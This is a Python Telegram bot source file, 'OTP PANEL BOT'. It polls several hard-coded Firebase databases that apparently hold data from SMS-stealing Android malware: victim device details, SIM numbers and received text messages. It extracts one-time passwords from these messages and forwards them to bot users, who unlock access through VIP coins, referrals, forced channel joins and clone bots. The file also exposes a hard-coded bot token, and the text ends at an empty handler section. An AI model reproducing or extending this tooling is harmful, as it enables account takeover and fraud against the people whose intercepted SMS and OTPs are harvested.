#!/usr/bin/env python3
"""
══════════════════════════════════════════════════════
    OTP PANEL BOT — SUPREME MASTER EDITION           
  All SMS View + Recent Categories + Pro Refer System
  + Deep Hidden Number Scanner (Admin Only)
  + Private Panels & Strict Double Penalty System
  + Controlled Spam Broadcast System (Max 40/user/day)
══════════════════════════════════════════════════════
"""

import os
import re
import time
import json
import asyncio
import logging
from datetime import datetime
from typing import Optional
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton, ChatMember
from telegram.error import BadRequest
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
)

logging.basicConfig(
    format="%(asctime)s — %(name)s — %(levelname)s — %(message)s",
    level=logging.WARNING,
)

# ═══════════════════════════════════════════════════════
#  CONFIG
# ═══════════════════════════════════════════════════════

DATABASES = {
    "R1": "https://rexxx-4c7a7-default-rtdb.firebaseio.com",
    "R2": "https://runjun-master-panel-default-rtdb.firebaseio.com",
    "A1": "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "A2": "https://rto9-d2b33-default-rtdb.firebaseio.com",
    "A3": "https://duuu-dc41d-default-rtdb.firebaseio.com",
    "A4": "https://rameshwar-7okt-default-rtdb.firebaseio.com"
}

POLL_INTERVAL   = 5        
SMS_LIMIT       = 15       
TOKEN           = "8218848065:AAGEg8EbJ2ArHRKfN04QMvSvD09V-wXtugY"
BOT_USERNAME    = "freepanelssmsbot"
DB_FILE         = "bot_database.json"

ADMIN_IDS: set[int] = {
    6860106371,   
}

REQUIRED_CHANNELS = [
    {"username": "leakmethodfree", "url": "https://t.me/leakmethodfree", "name": "Leak Method Free"},
    {"username": "sabkijayhokhush", "url": "https://t.me/sabkijayhokhush", "name": "Sabki Jay Ho Khush"},
]

OPTIONAL_GROUP = {"username": "findyourskills", "url": "https://t.me/findyourskills", "name": "Find Your Skills"}

# ═══════════════════════════════════════════════════════
#  GLOBAL STATE & HIGH-SPEED CACHE
# ═══════════════════════════════════════════════════════

seen_ids:  set[str] = set()   
first_run: bool     = True
_main_app: Optional[Application] = None
_http_session: Optional[aiohttp.ClientSession] = None

all_users: dict[int, dict] = {}
pending_action: dict[int, dict] = {}
user_cooldowns: dict[int, float] = {}
user_focus: dict[str, dict[int, str]] = {TOKEN: {}}  
chats_registry: dict[str, set[int]] = {TOKEN: set()} 

CLONES: dict[str, dict] = {}
GLOBAL_DEVICE_CACHE: dict[str, list] = {}

# Spam System State
spam_broadcast_active: bool = False
spam_counters: dict[int, dict] = {}  # {user_id: {"date": "YYYY-MM-DD", "count": 0}}

# ═══════════════════════════════════════════════════════
#  DATA SAVING & LOADING ENGINE (NON-BLOCKING)
# ═══════════════════════════════════════════════════════

def _sync_save_data():
    try:
        clones_to_save = {}
        for t, d in CLONES.items():
            clones_to_save[t] = {
                "creator": d.get("creator"),
                "expiry": d.get("expiry"),
                "custom_db": d.get("custom_db"),
                "users": d.get("users", {}),
                "username": d.get("username", ""),
                "notified": d.get("notified", False)
            }
        data_to_dump = {
            "all_users": all_users,
            "CLONES": clones_to_save,
            "spam_broadcast_active": spam_broadcast_active,
            "spam_counters": spam_counters
        }
        with open(DB_FILE, "w") as f:
            json.dump(data_to_dump, f, indent=4)
    except Exception as e:
        tlog(f"Save Data Error: {e}")

async def save_data_async():
    await asyncio.to_thread(_sync_save_data)

def load_data():
    global all_users, CLONES, spam_broadcast_active, spam_counters
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                
                loaded_users = data.get("all_users", {})
                for k, v in loaded_users.items():
                    all_users[int(k)] = v
                    
                loaded_clones = data.get("CLONES", {})
                for t, d in loaded_clones.items():
                    restored_users = {}
                    for uk, uv in d.get("users", {}).items():
                        restored_users[int(uk)] = uv
                    d["users"] = restored_users
                    d["notified"] = d.get("notified", False)
                    CLONES[t] = d
                
                spam_broadcast_active = data.get("spam_broadcast_active", False)
                spam_counters = {int(k): v for k, v in data.get("spam_counters", {}).items()}
        except Exception as e:
            tlog(f"Load Data Error: {e}")

async def auto_save_loop(app: Application):
    while True:
        await asyncio.sleep(3600)
        await save_data_async()
        try:
            total_users = len(all_users)
            total_otps = sum(u.get("otp_count", 0) for u in all_users.values())
            caption = (
                "⏰ HOURLY AUTOMATIC BACKUP REPORT\n"
                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                f"Total Users: {total_users}\nTotal OTPs Forwarded: {total_otps}\n\nAttached DB Backup:"
            )
            if os.path.exists(DB_FILE):
                with open(DB_FILE, "rb") as f:
                    await app.bot.send_document(chat_id=list(ADMIN_IDS)[0], document=f, filename=f"DB_{datetime.now().strftime('%Y%m%d_%H%M')}.json", caption=caption)
        except Exception as e:
            logging.error(f"Hourly Backup Error: {e}")

# ═══════════════════════════════════════════════════════
#  ANTI-SPAM & VIP LOGIC
# ═══════════════════════════════════════════════════════

def is_spamming(user_id: int) -> bool:
    if user_id in ADMIN_IDS:
        return False
    now = time.time()
    last_click = user_cooldowns.get(user_id, 0)
    if now - last_click < 1.0:  
        return True
    user_cooldowns[user_id] = now
    return False

def is_vip(bot_token: str, user_id: int) -> bool:
    if bot_token == TOKEN and user_id in ADMIN_IDS:
        return True
    if bot_token != TOKEN and user_id == CLONES.get(bot_token, {}).get("creator"):
        return True
        
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    user_data = users_db.get(user_id, {})
    
    if user_data.get("vip_paused_left", 0) > 0:
        return False
        
    vip_until = user_data.get("vip_until", 0.0)
    return time.time() < vip_until

def tlog(msg: str) -> None:
    t = datetime.now().strftime("%I:%M:%S %p")
    print(f"[{t}]  {msg}", flush=True)

async def global_error_handler(update: object, context: ContextTypes.DEFAULT_TYPE) -> None:
    tlog(f"Telegram API Error: {context.error}")

# ═══════════════════════════════════════════════════════
#  FAST HTTP SESSION MANAGER
# ═══════════════════════════════════════════════════════

async def get_http_session() -> aiohttp.ClientSession:
    global _http_session
    if _http_session is None or _http_session.closed:
        connector = aiohttp.TCPConnector(limit=1000, keepalive_timeout=30)
        _http_session = aiohttp.ClientSession(connector=connector)
    return _http_session

async def fb_get(path: str, base: str) -> Optional[dict]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json" if path else f"{base}/.json?shallow=true"
        if not path: url = url.replace("?shallow=true", ".json")
        
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200:
                return None
            data = await r.json(content_type=None)
            return data if isinstance(data, dict) else None
    except Exception:
        return None

async def fb_keys(path: str, base: str) -> list[str]:
    try:
        session = await get_http_session()
        url = f"{base}/{path}.json?shallow=true" if path else f"{base}/.json?shallow=true"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=5)) as r:
            if r.status != 200:
                return []
            data = await r.json(content_type=None)
            return list(data.keys()) if isinstance(data, dict) else []
    except Exception:
        return []

# ═══════════════════════════════════════════════════════
#  CHANNEL MEMBERSHIP & DOUBLE PENALTY
# ═══════════════════════════════════════════════════════

async def check_membership(bot_token, bot, user_id: int) -> list[str]:
    if bot_token != TOKEN:
        return [] 
    if user_id in ADMIN_IDS: return []

    not_joined = []
    for ch in REQUIRED_CHANNELS:
        try:
            member = await bot.get_chat_member(
                chat_id=f"@{ch['username']}", user_id=user_id
            )
            if member.status in (
                ChatMember.LEFT,
                ChatMember.BANNED,
                "kicked",
                "left",
            ):
                not_joined.append(ch["username"])
        except Exception:
            not_joined.append(ch["username"])
    return not_joined

async def check_penalty_routine(bot, chat_id, users_db):
    if chat_id in ADMIN_IDS: return False
    
    not_joined = await check_membership(TOKEN, bot, chat_id)
    if not_joined:
        user_data = users_db.get(chat_id, {})
        
        if user_data.get("verified") == False and user_data.get("penalty_multiplier", 1) == 2:
            return True
            
        users_db[chat_id]["vip_until"] = 0.0
        users_db[chat_id]["verified"] = False
        users_db[chat_id]["penalty_multiplier"] = 2
        
        try:
            await bot.send_message(chat_id, "🛑 <b>CRITICAL VIOLATION!</b>\n\nAapne channel leave kar diya hai. Aapka VIP access turant band kar diya gaya hai.\nAap par <b>DOUBLE PENALTY</b> lagayi gayi hai. Ab VIP ke liye aapko 100 coins chahiye.\nAapke inviter par bhi penalty lag gayi hai.", parse_mode="HTML")
        except: pass
        
        inviter_id = user_data.get("referred_by")
        if inviter_id and inviter_id in users_db:
            users_db[inviter_id]["vip_until"] = 0.0
            users_db[inviter_id]["penalty_multiplier"] = 2
            
            ref_list = users_db[inviter_id].get("referred_users", [])
            users_db[inviter_id]["referred_users"] = [u for u in ref_list if u.get("uid") != chat_id]
            users_db[inviter_id]["referrals"] = len(users_db[inviter_id]["referred_users"])
            
            try:
                await bot.send_message(inviter_id, f"⚠️ <b>PENALTY ALERT!</b>\n\nAapke invite kiye hue user {user_data.get('name')} ne channel leave kar diya hai!\nIs wajah se aapka VIP access bhi cancel ho gaya hai aur aap par <b>DOUBLE PENALTY</b> lagayi gayi hai.", parse_mode="HTML")
            except: pass
            
        await save_data_async()
        
        try:
            await bot.send_message(list(ADMIN_IDS)[0], f"🚨 <b>ADMIN ALERT: RULE VIOLATION</b>\n\nUser {user_data.get('name')} ({chat_id}) left the channels.\nDouble Penalty applied to them and their referrer {inviter_id}.", parse_mode="HTML")
        except: pass
        
        return True
    return False

async def send_join_prompt(update: Update, is_main_bot: bool) -> None:
    buttons = []
    for ch in REQUIRED_CHANNELS:
        lbl = "(Mandatory)" if is_main_bot else "(Optional)"
        buttons.append([InlineKeyboardButton(f"📢 Join {ch['name']} {lbl}", url=ch["url"])])
        
    buttons.append([InlineKeyboardButton(f"💬 Join {OPTIONAL_GROUP['name']} (Optional)", url=OPTIONAL_GROUP["url"])])
    buttons.append([InlineKeyboardButton("✅ I Have Joined — Check Now", callback_data="check_join")])
    
    if is_main_bot:
        text = "🔒 Verification Required\n\nPlease join our official channels to use this bot:\n"
    else:
        text = "👋 Welcome!\n\nPlease support us by joining our sponsor channels:\n"
        
    for ch in REQUIRED_CHANNELS:
        text += f"• {ch['name']}: {ch['url']}\n"
        
    text += "\nClick the check button after joining."
    
    await update.effective_message.reply_text(
        text,
        reply_markup=InlineKeyboardMarkup(buttons),
        disable_web_page_preview=True,
    )

# ═══════════════════════════════════════════════════════
#  UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════

def fmt_num(n: str) -> str:
    c = re.sub(r"\D", "", n)
    if c.startswith("91") and len(c) == 12: return f"+{c}"
    if len(c) == 10: return f"+91{c}"
    if len(c) > 4: return f"+{c}"
    return c

def bat_emoji(pct: int) -> str:
    return "🔋" if pct >= 20 else "🪫"

OTP_PATTERNS = [
    re.compile(r"OTP[^\d]*(\d{4,8})",        re.IGNORECASE),
    re.compile(r"code[^\d]*(\d{4,8})",       re.IGNORECASE),
    re.compile(r"password[^\d]*(\d{4,8})",   re.IGNORECASE),
    re.compile(r"\b(\d{6})\b"),
    re.compile(r"\b(\d{4})\b"),
]

def extract_otp(text: str) -> Optional[str]:
    for pat in OTP_PATTERNS:
        m = pat.search(text)
        if m: return m.group(1)
    return None

def parse_battery(val) -> int:
    if isinstance(val, (int, float)): return int(val)
    if isinstance(val, str):
        digits = re.sub(r"\D", "", val)
        return int(digits) if digits else 0
    return 0

def parse_status_str(val) -> str:
    if not val: return "offline"
    return "online" if str(val).lower() == "online" else "offline"

def parse_status_bool(val) -> str:
    return "online" if val is True else "offline"

def sms_date(sms: dict) -> str:
    date_str = sms.get("date") or sms.get("receivedDate") or sms.get("recivedDate")
    if date_str: return date_str
    
    if sms.get("timestamp"):
        try:
            ts = float(sms["timestamp"])
            if ts > 1e11: ts /= 1000
            return datetime.fromtimestamp(ts).strftime("%d %b %Y %I:%M %p")
        except: pass
    return "N/A"

def seen_key(device_id: str, k: str) -> str:
    return f"{device_id}/{k}"

def user_display(info: dict) -> str:
    name = info.get("name", "Unknown")
    uname = info.get("username", "")
    return f"{name} (@{uname})" if uname else name

# ═══════════════════════════════════════════════════════
#  DATA CLASSES
# ═══════════════════════════════════════════════════════

PAGE_SIZE = 20

class Device:
    __slots__ = (
        "id", "name", "status", "battery", "timestamp",
        "numbers", "device_info", "sms_path", "base_url", "db_tag"
    )

    def __init__(self, id, name, status, battery, timestamp, numbers, device_info, sms_path, base_url, db_tag):
        self.id = id
        self.name = name
        self.status = status
        self.battery = battery
        self.timestamp = timestamp
        self.numbers = numbers
        self.device_info = device_info
        self.sms_path = sms_path
        self.base_url = base_url
        self.db_tag = db_tag

# ═══════════════════════════════════════════════════════
#  FIREBASE DATA FETCHERS 
# ═══════════════════════════════════════════════════════

async def fetch_db_data(tag: str, url: str) -> list[Device]:
    devices_list = []
    added_set = set()
    try:
        root_keys, sim_all, device_info_all, user_data_all, clients_all = await asyncio.gather(
            fb_keys("", url),
            fb_get("All_Users/simDetails", url),
            fb_get("All_Users/Data/DeviceInfo", url),
            fb_get("user_data", url),
            fb_get("clients", url),
        )
        
        if sim_all and isinstance(sim_all, dict):
            info_all = device_info_all or {}
            for dev_id, sim in sim_all.items():
                if dev_id in added_set: continue
                added_set.add(dev_id)
                info = info_all.get(dev_id) or {}
                nums = []
                for field in ("sim1Number", "sim2Number"):
                    n = (sim or {}).get(field, "") or ""
                    if n and len(re.sub(r"\D", "", n)) > 4: nums.append(fmt_num(n))
                
                model = info.get("DeviceModel") or info.get("Brand") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_str(info.get("Status")),
                    battery=parse_battery(info.get("Battery")), timestamp=int(info.get("currentTimeMillis") or 0),
                    numbers=nums, device_info=f"Model: {model}\nBrand: {info.get('Brand','')}\nAndroid: {info.get('AndroidVersion','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))

        if user_data_all and isinstance(user_data_all, dict):
            for dev_id, data in user_data_all.items():
                if dev_id in added_set: continue
                if not isinstance(data, dict): continue
                added_set.add(dev_id)
                
                nums = []
                for field in ("numberSim1", "numberSim2", "mobNo"):
                    n = data.get(field, "")
                    if n and len(re.sub(r"\D", "", str(n))) > 4: nums.append(fmt_num(str(n)))

                devices_list.append(Device(
                    id=dev_id, name=data.get("d_name") or f"Device-{dev_id[:6]}",
                    status=parse_status_str(data.get("status")), battery=parse_battery(data.get("battery")),
                    timestamp=int(data.get("timestamp") or 0), numbers=nums,
                    device_info=data.get("Device_info") or f"Device ID: {dev_id}",
                    sms_path=f"user_sms/{dev_id}", base_url=url, db_tag=tag
                ))

        if clients_all and isinstance(clients_all, dict):
            for dev_id, client in clients_all.items():
                if dev_id in added_set: continue
                if not isinstance(client, dict): continue
                nums = []
                mob = client.get("mobNo") or ""
                if mob and len(re.sub(r"\D", "", mob)) > 5: nums.append(fmt_num(mob))
                elif client.get("sims") and isinstance(client["sims"], list):
                    if len(client["sims"]) > 0:
                        ph = (client["sims"] or {}).get("phoneNumber") or ""
                        if ph and len(re.sub(r"\D", "", ph)) > 5: nums.append(fmt_num(ph))
                if not nums and not client.get("modelName"): continue
                added_set.add(dev_id)
                model = client.get("modelName") or f"Device-{dev_id[:6]}"
                devices_list.append(Device(
                    id=dev_id, name=model, status=parse_status_bool(client.get("status")),
                    battery=parse_battery(client.get("battery")), timestamp=0, numbers=nums,
                    device_info=f"Model: {model}\nProvider: {client.get('service_provider','')}\nAndroid: {client.get('androidV','')}\nDevice ID: {dev_id}",
                    sms_path=f"All_Users/sms/{dev_id}", base_url=url, db_tag=tag
                ))

        if root_keys:
            type4_keys = [k for k in root_keys if len(k) == 16 and re.match(r"^[0-9a-fA-F]+$", k)]
            if type4_keys:
                async def fetch_t4(k):
                    info, sim, hb = await asyncio.gather(
                        fb_get(f"{k}/deviceInfo", url), fb_get(f"{k}/simInfo", url), fb_get(f"{k}/heartbeat", url)
                    )
                    return k, info, sim, hb
                
                results = await asyncio.gather(*(fetch_t4(k) for k in type4_keys))
                for k, info, sim, hb in results:
                    if not isinstance(info, dict): continue
                    if k in added_set: continue
                    added_set.add(k)
                    
                    nums = []
                    if isinstance(sim, dict):
                        for sim_k, sim_v in sim.items():
                            if isinstance(sim_v, dict):
                                n = sim_v.get("number", "")
                                if n and len(re.sub(r"\D", "", n)) > 4: nums.append(fmt_num(n))
                    
                    model = info.get("model") or info.get("brand") or f"Device-{k[:6]}"
                    ts = int(hb) if isinstance(hb, (int, float)) else 0
                    is_online = (time.time() * 1000 - ts) < 300000 if ts else False
                    status = "online" if is_online else "offline"
                    
                    devices_list.append(Device(
                        id=k, name=model, status=status, battery=0, timestamp=ts, numbers=nums,
                        device_info=f"Model: {model}\nBrand: {info.get('brand','')}\nAndroid: {info.get('version','')}\nDevice ID: {k}",
                        sms_path=f"{k}/receivedSms", base_url=url, db_tag=tag
                    ))

    except Exception:
        pass
    return devices_list

async def get_device_sms(device: Device, limit: int = SMS_LIMIT) -> list[dict]:
    data = await fb_get(device.sms_path, device.base_url)
    if not data: return []
    entries = [{"_key": k, **v} for k, v in data.items() if isinstance(v, dict)]
    entries.sort(key=lambda s: int(s.get("timestamp") or 0), reverse=True)
    return entries[:limit]

# ═══════════════════════════════════════════════════════
#  BOT SPANWER ENGINE (HOSTING CLONES)
# ═══════════════════════════════════════════════════════

async def start_clone_bot(clone_token: str):
    app = (
        Application.builder()
        .token(clone_token)
        .connection_pool_size(1000)
        .pool_timeout(60.0)
        .connect_timeout(30.0)
        .read_timeout(30.0)
        .write_timeout(30.0)
        .build()
    )
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CallbackQueryHandler(on_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, on_text))
    app.add_error_handler(global_error_handler)
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    return app

# ═══════════════════════════════════════════════════════
#  MESSAGE BUILDERS & UI
# ═══════════════════════════════════════════════════════

def get_reply_menu(is_admin: bool, bot_token: str, chat_id: int = 0) -> ReplyKeyboardMarkup:
    users_db = all_users if bot_token == TOKEN else CLONES.get(bot_token, {}).get("users", {})
    user_spam_active = users_db.get(chat_id, {}).get("global_spam", False)
    spam_btn = "🔥 Global Spam: ON" if user_spam_active else "🔥 Global Spam: OFF"

    keys = [
        [KeyboardButton("📱 Devices List"), KeyboardButton("🔍 Search Number")],
        [KeyboardButton("📬 Recent SMS Numbers"), KeyboardButton("🏆 Leaderboard")],
        [KeyboardButton("👤 My Profile"), KeyboardButton(spam_btn)]
    ]
    
    if bot_token == TOKEN:
        bots_created = users_db.get(chat_id, {}).get("bot_creation_count", 0) if chat_id else 0
        req_bot_coins = 50 + (bots_created * 10) # Base 50 for clone
        
        keys.insert(2, [KeyboardButton("👑 Buy VIP Access"), KeyboardButton("💸 Refer & Earn")])
        keys.insert(3, [KeyboardButton(f"🤖 Create Your Bot ({req_bot_coins} Coins)"), KeyboardButton("➕ Add Private Panel")])
        keys.insert(4, [KeyboardButton("💬 Support Group")])
    else:
        keys.append([KeyboardButton("💬 Support Group")])
        
    if is_admin:
        admin_row = [KeyboardButton("🛡 Admin Panel"), KeyboardButton("⚡ Super Admin")]
        keys.append(admin_row)
        
    return ReplyKeyboardMarkup(keys, resize_keyboard=True)

def device_label(d: Device) -> str:
    if d.numbers: return " & ".join(d.numbers)
    return f"{d.name} ({d.id[:8]})"

def device_list_header(devices: list[Device], page: int = 0) -> str:
    online  = sum(1 for d in devices if d.status == "online")
    offline = len(devices) - online
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    return (
        f"✨ OTP PANEL PRO ✨\n━━━━━━━━━━━━━━━━━━\n🟢 Online: {online}   🔴 Offline: {offline}\n"
        f"📱 Total: {len(devices)} Devices\n📄 Page {page + 1} of {total_pages}\n━━━━━━━━━━━━━━━━━━\nSelect a number below to connect and receive its OTPs:"
    )

def device_list_keyboard(devices: list[Device], page: int = 0) -> InlineKeyboardMarkup:
    total_pages = max(1, (len(devices) + PAGE_SIZE - 1) // PAGE_SIZE)
    page        = max(0, min(page, total_pages - 1))
    start       = page * PAGE_SIZE
    page_devs   = devices[start : start + PAGE_SIZE]
    rows: list[list[InlineKeyboardButton]] = []

    def _btn(d: Device) -> InlineKeyboardButton:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} 📱 {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} ⚙️ {tag}{d.name} ({d.id[:6]})"
        return InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")

    for d in page_devs: rows.append([_btn(d)])

    nav: list[InlineKeyboardButton] = []
    if page > 0: nav.append(InlineKeyboardButton("◀️ Prev", callback_data=f"pg:{page - 1}"))
    nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ▶️", callback_data=f"pg:{page + 1}"))
    rows.append(nav)
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🔍 Online Only", callback_data="online")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

# ─── RECENT SMS CATEGORY UI ─────────────────────────────
def get_recent_category_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📅 Today's Active (Last 24h)", callback_data="rcat:today")],
        [InlineKeyboardButton("📆 Yesterday's (24h - 48h)", callback_data="rcat:yesterday")],
        [InlineKeyboardButton("🔥 All Recent Numbers", callback_data="rcat:all")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def get_categorized_recent_keyboard(devices: list[Device], cat: str) -> InlineKeyboardMarkup:
    now_ms = int(time.time() * 1000)
    day_ms = 86400000
    
    filtered = []
    for d in devices:
        d_ts = d.timestamp
        if d_ts > 0 and d_ts < 1e11:
            d_ts *= 1000
            
        if cat == "today":
            if d_ts >= now_ms - day_ms:
                filtered.append(d)
        elif cat == "yesterday":
            if now_ms - (2 * day_ms) <= d_ts < now_ms - day_ms:
                filtered.append(d)
        else:
            filtered.append(d)
            
    filtered = filtered[:20] 
    
    rows = []
    for d in filtered:
        tag  = f"[{d.db_tag}] "
        icon = "🟢" if d.status == "online" else "🔴"
        if d.numbers:
            lbl = f"{icon} 📱 {tag}{d.numbers[0]}"
            if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
        else:
            lbl = f"{icon} ⚙️ {tag}{d.name[:8]}"
        rows.append([InlineKeyboardButton(lbl, callback_data=f"r_msgs:{d.id}")])
        
    rows.append([InlineKeyboardButton("🔙 Back to Categories", callback_data="recent_menu")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def online_only_keyboard(devices: list[Device]) -> InlineKeyboardMarkup:
    online = [d for d in devices if d.status == "online"]
    rows: list[list[InlineKeyboardButton]] = []
    if online:
        for d in online:
            tag = f"[{d.db_tag}] "
            if d.numbers:
                lbl = f"🟢 📱 {tag}{d.numbers[0]}"
                if len(d.numbers) > 1: lbl += f" & {d.numbers[1]}"
            else:
                lbl = f"🟢 ⚙️ {tag}{d.name} ({d.id[:6]})"
            rows.append([InlineKeyboardButton(lbl, callback_data=f"sel:{d.id}")])
    else:
        rows.append([InlineKeyboardButton("😴 No devices online", callback_data="noop")])
    rows.append([InlineKeyboardButton("🔄 Refresh", callback_data="online"), InlineKeyboardButton("📋 All Numbers", callback_data="pg:0")])
    rows.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(rows)

def format_sms_block(sms: dict, num_label: str) -> tuple[str, Optional[str]]:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    lines  = []
    if otp: lines.append(f"🔑 OTP: <code>{otp}</code>")
    lines.append(f"👤 From: {sender}\n📅 Date: {date}")
    if sim: lines.append(f"📡 SIM: {sim}")
    lines.append(f"📱 Number: {num_label}\n\n💬 Message: {body}")
    return "\n".join(lines), otp

def auto_forward_msg(sms: dict, num_label: str) -> str:
    body   = sms.get("body") or sms.get("message") or sms.get("text") or ""
    otp    = extract_otp(body)
    date   = sms_date(sms)
    sim    = sms.get("sim_number") or ""
    sender = sms.get("sender") or "Unknown"
    
    if otp:
        sim_line = f"│ 📡 SIM : {sim}\n" if sim else ""
        return f"✨ NEW OTP RECEIVED ✨\n━━━━━━━━━━━━━━━━━━\n│ 🔢 OTP : <code>{otp}</code>\n│ 📱 Number : {num_label}\n│ 👤 From : {sender}\n│ 📅 Date : {date}\n{sim_line}━━━━━━━━━━━━━━━━━━\n💬 {body}"
    return f"📩 NEW SMS RECEIVED\n━━━━━━━━━━━━━━━━━━\n📱 Number : {num_label}\n👤 From : {sender}\n📅 Date : {date}\n━━━━━━━━━━━━━━━━━━\n💬 {body}"

def device_action_keyboard(dev_id: str) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("📩 View All Messages", callback_data=f"msgs:{dev_id}"), InlineKeyboardButton("ℹ️ Device Info", callback_data=f"info:{dev_id}")],
        [InlineKeyboardButton("🔙 Disconnect & Back", callback_data="home")],
    ])

def get_vip_denied_keyboard(chat_id: int) -> InlineKeyboardMarkup:
    ref_link = f"https://t.me/{BOT_USERNAME}?start={chat_id}"
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💸 Get Referral Link To Earn Coins", url=f"https://t.me/share/url?url={ref_link}&text=Try this premium OTP Panel Bot!")],
        [InlineKeyboardButton("❌ Close", callback_data="close_msg")]
    ])

def get_profile_text(chat_id: int, users_db: dict, is_main_bot: bool) -> str:
    user_data = users_db.get(chat_id, {})
    prof_text = f"👤 MY PROFILE\n━━━━━━━━━━━━━━━━━━\nName: {user_data.get('name', 'Unknown')}\nID: <code>{chat_id}</code>\nJoined: {user_data.get('joined_at', 'N/A')}\n"
    if is_main_bot: 
        prof_text += f"Coins Balance: {user_data.get('coins', 0)} 🪙\nTotal Referrals: {user_data.get('referrals', 0)} 👥\nBots Created: {user_data.get('bot_creation_count', 0)} 🤖\nPrivate Panels: {len(user_data.get('private_panels', []))}\n"
    
    multiplier = user_data.get("penalty_multiplier", 1)
    if multiplier == 2:
        prof_text += "\n⚠️ STATUS: DOUBLE PENALTY ACTIVE\n(Rule broken. Prices doubled.)\n\n"
        
    paused_left = user_data.get("vip_paused_left", 0)
    if paused_left > 0:
        h = int(paused_left // 3600)
        m = int((paused_left % 3600) // 60)
        vip_status = f"{h}h {m}m (⏸ Paused)"
    else:
        left = user_data.get("vip_until", 0.0) - time.time()
        if left > 0:
            h = int(left // 3600)
            m = int((left % 3600) // 60)
            vip_status = f"{h}h {m}m"
        else:
            vip_status = "Not VIP"

    prof_text += f"Total OTPs Used: {user_data.get('otp_count', 0)} 📩\nVIP Status: {vip_status}\nGlobal Spam: {'ON' if user_data.get('global_spam') else 'OFF'}\n"
    return prof_text

def get_profile_keyboard(chat_id: int, users_db: dict) -> InlineKeyboardMarkup:
    kb = []
    user_data = users_db.get(chat_id, {})
    paused_left = user_data.get("vip_paused_left", 0)
    
    if paused_left > 0:
        kb.append([InlineKeyboardButton("▶️ Resume VIP", callback_data="vip_resume")])
    elif user_data.get("vip_until", 0.0) > time.time():
        kb.append([InlineKeyboardButton("⏸ Pause VIP", callback_data="vip_pause")])
        
    kb.append([InlineKeyboardButton("🔄 Refresh", callback_data="refresh_profile")])
    kb.append([InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(kb)

def admin_panel_text(bot_token: str) -> str:
    users_db = all_users if bot_token == TOKEN else CLONES[bot_token]["users"]
    total    = len(users_db)
    verified = sum(1 for u in users_db.values() if u.get("verified"))
    unverified = total - verified
    total_otps = sum(u.get("otp_count", 0) for u in users_db.values())
    active_chats = len(chats_registry.get(bot_token, set()))
    
    status_spam = "ON" if spam_broadcast_active else "OFF"
    
    text = f"🛡 ADMIN PANEL\n━━━━━━━━━━━━━━━━━━\n👥 Total Users    : {total}\n✅ Verified Users : {verified}\n⏳ Unverified     : {unverified}\n📡 Active Chats   : {active_chats}\n🏆 Total OTP Views: {total_otps}\n"
    text += f"🔥 Spam Broadcast : {status_spam}\n"
    if bot_token == TOKEN: text += f"🤖 Cloned Bots    : {len(CLONES)}\n"
    text += f"━━━━━━━━━━━━━━━━━━\n🕐 Updated: {datetime.now().strftime('%d %b %Y %I:%M %p')}"
    return text

def admin_keyboard(bot_token: str) -> InlineKeyboardMarkup:
    keys = [
        [InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"), InlineKeyboardButton("👥 User List", callback_data="admin_users")],
        [InlineKeyboardButton("🔥 Spam Broadcast", callback_data="admin_spam_broadcast")]
    ]
    if bot_token != TOKEN: keys.append([InlineKeyboardButton("🔗 Add Custom Firebase URL", callback_data="add_custom_db")])
    keys.append([InlineKeyboardButton("🔄 Refresh", callback_data="admin_refresh"), InlineKeyboardButton("❌ Close", callback_data="close_msg")])
    return InlineKeyboardMarkup(keys)

async def safe_edit(query, text, reply_markup=None, parse_mode="HTML", disable_web_page_preview=False):
    try:
        await query.edit_message_text(text, reply_markup=reply_markup, parse_mode=parse_mode, disable_web_page_preview=disable_web_page_preview)
    except BadRequest as e:
        if "not modified" not in str(e).lower(): tlog(f"Edit Message Error: {e}")
    except Exception as e:
        tlog(f"Safe Edit Unexpected Error: {e}")

# ═══════════════════════════════════════════════════════
#  TELEGRAM COMMAND HANDLERS
# ═══════════════════════════════════════════════════════

